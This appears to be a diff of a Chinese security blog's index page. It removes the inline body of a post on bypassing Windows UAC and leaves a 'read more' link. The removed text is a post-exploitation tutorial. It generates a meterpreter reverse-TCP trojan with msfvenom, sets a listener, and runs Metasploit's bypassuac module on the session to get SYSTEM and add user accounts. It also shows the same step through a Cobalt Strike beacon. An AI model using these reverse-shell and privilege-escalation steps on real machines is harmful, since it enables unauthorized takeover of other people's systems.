@@ -455,7 +455,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2019-11-09 18:12:19" itemprop="dateModified" datetime="2019-11-09T18:12:19+08:00">2019-11-09</time>
+                <time title="修改时间：2019-11-09 18:14:33" itemprop="dateModified" datetime="2019-11-09T18:14:33+08:00">2019-11-09</time>
               
             
           </span>
@@ -489,19 +489,16 @@
 
       
         
+          <p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br></p>
+          <!--noindex-->
           
-            <p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！</p>
-<h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p>
-<h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure>
-<p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p>
-<p>getsystem是有问题的，说明不是最高权限</p>
-<p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p>
-<p>bypassuac成功，可以添加用户了</p>
-<h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/11/08/Windows下bypassuac/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
